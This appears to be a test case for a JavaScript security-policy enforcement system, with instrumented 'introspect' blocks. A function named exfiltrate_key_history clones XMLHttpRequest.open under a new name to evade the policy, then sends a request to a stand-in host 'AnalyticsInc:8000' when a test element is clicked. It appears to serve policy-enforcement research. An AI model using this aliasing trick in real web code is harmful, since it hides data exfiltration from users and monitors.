function exfiltrate_key_history() {
  function v0() {
    function temp() {
      return that.apply(this, arguments);
    }
    var that = this;
    var key$$14;
    for (key$$14 in this) {
      var v1 = this.hasOwnProperty(key$$14);
      if (v1) {
        introspect(JAM.policy.p1) {
          temp[key$$14] = this[key$$14];
        }
      }
    }
    return temp;
  }
  xmlhttp = new XMLHttpRequest;
  introspect(JAM.policy.p1) {
    var v2 = xmlhttp.open
  }
  v2.clone = v0;
  var v3 = xmlhttp;
  introspect(JAM.policy.p1) {
    var v5 = xmlhttp.open
  }
  var v6 = v5.clone();
  v3.opennew = v6;
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true);
  xmlhttp.send(null);
  return;
}
var v4 = document.getElementById("test");
v4.onclick = exfiltrate_key_history
